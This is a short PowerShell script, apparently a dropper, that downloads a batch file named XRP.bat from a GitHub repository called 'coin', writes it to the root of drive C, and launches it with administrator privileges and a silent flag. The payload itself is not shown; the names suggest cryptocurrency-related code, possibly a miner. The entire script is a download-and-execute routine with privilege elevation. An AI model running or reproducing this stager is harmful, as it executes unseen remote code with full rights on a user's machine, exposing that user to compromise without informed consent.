powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRP.bat" -OutFile "C:\XRP.bat"
powershell.exe Start-Process -FilePath "C:\XRP.bat" -ArgumentList "/S" -Verb RunAs
powershell.exe exit
